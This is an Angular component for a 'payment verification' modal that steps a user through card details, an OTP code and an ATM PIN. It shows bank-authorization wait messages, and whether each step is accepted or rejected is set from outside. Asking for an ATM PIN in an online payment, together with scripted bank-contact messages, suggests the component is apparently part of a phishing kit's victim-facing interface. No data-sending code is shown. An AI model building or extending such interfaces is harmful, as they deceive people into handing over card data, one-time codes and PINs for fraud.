import { Component, Input, Output, EventEmitter } from '@angular/core';
import { CommonModule } from '@angular/common';

export type VerificationStatus = 'checking' | 'accepted' | 'rejected';
export type VerificationStep = 'card' | 'otp' | 'atm';

@Component({
  selector: 'app-payment-verification-modal',
  standalone: true,
  imports: [CommonModule],
  templateUrl: './payment-verification-modal.html',
  styleUrl: './payment-verification-modal.css'
})
export class PaymentVerificationModal {
  @Input() isOpen = false;
  @Input() status: VerificationStatus = 'checking';
  @Input() step: VerificationStep = 'card';
  @Input() errorMessage: string = '';

  @Output() retry = new EventEmitter<void>();

  onRetry(): void {
    this.retry.emit();
  }

  getTitle(): string {
    if (this.status === 'accepted') {
      if (this.step === 'card') return 'Card Verified Successfully';
      if (this.step === 'otp') return 'OTP Code Verified';
      return 'Payment Approved Successfully';
    }
    if (this.status === 'rejected') {
      if (this.step === 'card') return 'Card Verification Declined';
      if (this.step === 'otp') return 'Invalid OTP Code';
      return 'ATM PIN Verification Failed';
    }
    // checking
    if (this.step === 'card') return 'Verifying Card Details';
    if (this.step === 'otp') return 'Verifying Security Code';
    return 'Authorizing ATM PIN';
  }

  getSubtitle(): string {
    if (this.status === 'accepted') {
      return 'Approved by bank. Redirecting to next step...';
    }
    if (this.status === 'rejected') {
      return this.errorMessage || 'The operation was declined by the bank. Please try again.';
    }
    if (this.step === 'card') {
      return 'Contacting your card issuing bank for authorization. Please do not refresh or leave this page.';
    }
    if (this.step === 'otp') {
      return 'Verifying the 6-digit confirmation code with your bank. Please do not close this window.';
    }
    return 'Connecting to bank network for PIN authorization. This may take a few moments.';
  }
}
